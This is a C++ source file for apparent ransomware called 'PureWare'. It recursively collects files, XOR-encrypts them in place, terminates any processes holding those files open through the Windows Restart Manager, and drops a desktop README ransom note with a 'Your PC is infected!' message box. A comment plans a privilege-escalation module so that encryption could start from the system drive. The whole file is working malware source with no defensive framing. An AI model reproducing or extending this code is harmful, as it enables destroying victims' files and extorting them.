#include "PureWare.hpp"

using namespace std;
auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");

void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript);
void encryptFile(const std::filesystem::path& path, const std::string& key);
void decryptFile(const path_t& filePath, const std::string& key);
void checkIfInUse(std::filesystem::path filePath);
void terminateProcessById(DWORD processId);

int main(int argc, char* argv[])
{
    setlocale(LC_ALL, "Russian");
    path_t directory = "C:/Users/-/Desktop/PureWare";
    std::vector<path_t> pathToCript;

    file_logger->set_level(spdlog::level::info);
    file_logger->info("start the Cript");

    traverseDirectory(directory, pathToCript);

    string key{ 12 };
    for (const auto& NextFile : pathToCript) {
        file_logger->info("path {}", NextFile.string());
        if (std::filesystem::is_regular_file(NextFile)) {
            encryptFile(NextFile, key);
        }
    }

    NoteModule warn_user;
    warn_user.NotifyUsersAboutWorkResults();

    return 0;
}

void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
    try {
        if (filesystem::exists(path) && filesystem::is_directory(path)) {
            bool isEmpty = true;
            for (const auto& entry : filesystem::directory_iterator(path)) {
                auto filePath = entry.path();
                // Skip specific directories
                if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") {
                    continue;
                }

                if (entry.is_directory()) {
                    // Recursive call to traverse subdirectories
                    traverseDirectory(filePath, pathToCript);
                    isEmpty = false;
                }
                else if (entry.is_regular_file()) {
                    // Add file to the vector
                    pathToCript.emplace_back(filePath);
                    isEmpty = false;
                }
            }

            if (!isEmpty) {
                // Add non-empty directory to the vector
                pathToCript.emplace_back(path);
            }
        }
    }
    catch (const filesystem::filesystem_error& e) {
        file_logger->error("Filesystem error : {}", e.what());
    }
    catch (const std::exception& e) {
        file_logger->error("Standard exception:  {}", e.what());
    }
    catch (...) {
        file_logger->error("Unknown error occurred last:  {}", GetLastError());
    }
}

void encryptFile(const std::filesystem::path& path, const std::string& key) {

    checkIfInUse(path);

    // Проверка существования файла и доступности для чтения
    if (!std::filesystem::exists(path) || !std::filesystem::is_regular_file(path)) {
        file_logger->critical("Файл не найден или это не файл: {}", path.string());
        return;
    }

    // Открытие файла для чтения в бинарном режиме
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) {
        file_logger->critical("Не удалось открыть файл для чтения: {}", path.string());
        return;
    }

    // Чтение содержимого файла
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // XOR шифрование
    for (size_t i = 0; i < buffer.size(); ++i) {
        buffer[i] ^= key[i % key.length()];
    }

    // Запись зашифрованных данных обратно в файл
    std::ofstream outfile(path, std::ios::binary);
    if (!outfile.is_open()) {
        file_logger->critical("Не удалось открыть файл для записи : {}", path.string());
        return;
    }

    outfile.write(buffer.data(), buffer.size());
    outfile.close();
}

void decryptFile(const path_t& filePath, const std::string& key) {
    // Open the file for reading in binary mode
    std::ifstream fileIn(filePath, std::ios::binary);
    if (!fileIn) {
        file_logger->critical("Cannot open file: {}", filePath.string());
        return;
    }
    // Read the file content
    std::string fileContent((std::istreambuf_iterator<char>(fileIn)), std::istreambuf_iterator<char>());
    fileIn.close();

    // Perform XOR decryption (same as encryption)
    for (size_t i = 0; i < fileContent.size(); ++i) {
        fileContent[i] ^= key[i % key.size()];
    }

    // Write the decrypted content back to the file
    std::ofstream fileOut(filePath, std::ios::binary);
    if (!fileOut) {
        file_logger->critical("Cannot open file: {}", filePath.string());
        return;
    }

    fileOut.write(fileContent.data(), fileContent.size());
    fileOut.close();
}

void checkIfInUse(std::filesystem::path filePath)
{
    // Start a new Restart Manager session
    DWORD dwSession;
    WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
    DWORD dwError = RmStartSession(&dwSession, 0, szSessionKey);
    if (dwError != ERROR_SUCCESS) {
        file_logger->error("RmStartSession failed: ", dwError);
        return;
    }

    // Register resources (files) to a Restart Manager session
    LPCWSTR filePaths[] = { filePath.c_str() };
    dwError = RmRegisterResources(dwSession, 1, filePaths, 0, NULL, 0, NULL);
    if (dwError != ERROR_SUCCESS) {
        file_logger->error("RmRegisterResources failed: ", dwError);
        RmEndSession(dwSession);
        return;
    }

    // Get the list of processes that are using the file
    DWORD dwReason;
    UINT nProcInfoNeeded = 0;
    UINT nProcInfo = 0;
    UINT ProcAm = 0;
    RM_PROCESS_INFO* pids = nullptr;
    dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, NULL, &dwReason);
    if (dwError == ERROR_MORE_DATA) {
        // Some process is using the file
        // Allocate space and call RmGetList again
        nProcInfo = nProcInfoNeeded;
        delete[] pids;
        pids = new RM_PROCESS_INFO[nProcInfo]();
        ProcAm = nProcInfo;
        dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, pids, &dwReason);
    }

    if (dwError == ERROR_SUCCESS && pids != nullptr) {
        for (UINT i = 0; i < ProcAm; ++i) {
            terminateProcessById(pids[i].Process.dwProcessId);
        }
    }
    else {
        file_logger->error("RmGetList failed: ", dwError);
    }

    delete[] pids;

    // End the Restart Manager session
    RmEndSession(dwSession);
}

void terminateProcessById(DWORD processId)
{
    HANDLE processHandle = NULL;

    // Open the process
    processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, processId);

    if (processHandle == NULL) {
        file_logger->error("OpenProcess() failed: ", GetLastError());
        return;
    }

    // Terminate the process
    if (!TerminateProcess(processHandle, 1)) {
        file_logger->error("TerminateProcess() failed: ", GetLastError());
    }

    // Close the process handle
    CloseHandle(processHandle);
}

// Public method that writes user's home directory to the private class variable "directory"
void FileModule::FindDirectory() {

    std::string homeDir;
    PWSTR directoryPath = nullptr;

    // Here we should run the PrivEsc class module and if it returns true, then start working from the 'C:\' i.e.
    // and if it returns false, just take the user's home directory

    // works from Windows Vista and later, alternative for elders's - SHGetFolderPath
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &directoryPath))) {
        directoryPath_ = directoryPath;
    }

    CoTaskMemFree(directoryPath); // need to free because SHGetKnownFolderPath allocates address and stores path in it

}


// NoteModule implementation starts here

NoteModule::NoteModule() : Note_that_would_be_set_in_file(L"Your PC's files were encrypted.\n") {
}

NoteModule::NoteModule(std::wstring Note_that_would_be_set_in_file) : Note_that_would_be_set_in_file(Note_that_would_be_set_in_file) {
}

// This method notifies user about program.
// Starts windows to attract attetnion and creates REAME file with needed explanations.
void NoteModule::NotifyUsersAboutWorkResults() {
    // Getting the path to the user's desktop
    wchar_t desktopPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);

    // Creating the full path of the README.txt file
    path_t README_file_path = path_t(desktopPath) / L"README.txt";
    Create_README_file(README_file_path);

    // Message Box that notifies user about encrypting files and asks to read README
    int msgboxID = MessageBox(
        NULL,
        "Your PC is infected!\nCheck the README.txt file on your desktop.\nPush \"Yes\" button to open the file right now.",
        "CHECK README!",
        MB_ICONEXCLAMATION | MB_YESNO
    );

    // If msbox's "Yes" button was pushed - open README.
    if (msgboxID == IDYES) {
        ShellExecute(NULL, "open", README_file_path.string().c_str(), NULL, NULL, SW_SHOWNORMAL);
    }
}

// Method that creates README file at Desktop
void NoteModule::Create_README_file(const path_t& README_path) {
    // Checking the file's existence and creating if not 
    std::filesystem::create_directories(README_path.parent_path());

    // Opening a file for writing
    std::wofstream out(README_path);
    if (!out) {
        std::cerr << "Не удалось открыть файл для записи, по пути:" << README_path << std::endl;
        return;
    }

    // Moving variable's content into a file
    out << Note_that_would_be_set_in_file << std::endl;

    out.close();
}

// NoteModule implementation ends here